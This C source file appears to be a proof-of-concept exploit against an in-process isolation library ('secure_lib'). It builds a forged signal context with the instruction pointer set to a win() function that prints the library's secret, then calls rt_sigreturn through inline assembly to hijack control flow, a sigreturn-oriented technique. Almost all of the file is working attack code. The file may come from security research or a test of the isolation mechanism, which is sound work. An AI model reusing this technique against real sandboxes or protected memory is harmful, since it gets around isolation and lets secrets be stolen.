#define _GNU_SOURCE
#include <signal.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <ucontext.h>

#include "secure_lib.h"


#define ALTSTACK_SIZE (1024*1024*32)
#define PAGE_SIZE (4096)
#define PAGE_MASK (~(PAGE_SIZE - 1))


void win() {
    fprintf(stderr, "TRYING TO STEAL THE SECRET: %s\n", secure_lib_secret);
    exit(0);
}

int main() {
    secure_lib_init();


    char *stack = malloc(ALTSTACK_SIZE + PAGE_SIZE*2);
    stack = (char*)((uint64_t)(stack + PAGE_SIZE) & PAGE_MASK);

    ucontext_t *ucontext = calloc(sizeof(ucontext_t)+4096, 1);
    ucontext->uc_mcontext.fpregs = (void*)(((char*)&(ucontext->__fpregs_mem))+24);
    ucontext->uc_mcontext.gregs[REG_RIP] = (uint64_t)win;
    ucontext->uc_mcontext.gregs[REG_CSGSFS] = ((uint64_t)0x33);
    ucontext->uc_mcontext.gregs[REG_RSP] = (uint64_t)(stack + ALTSTACK_SIZE - PAGE_SIZE);

    asm volatile (
            "mov %0, %%rsp;" 
            "mov $15, %%rax;" 
            "syscall"
            :
            : "r" (ucontext));

    return 0;
}


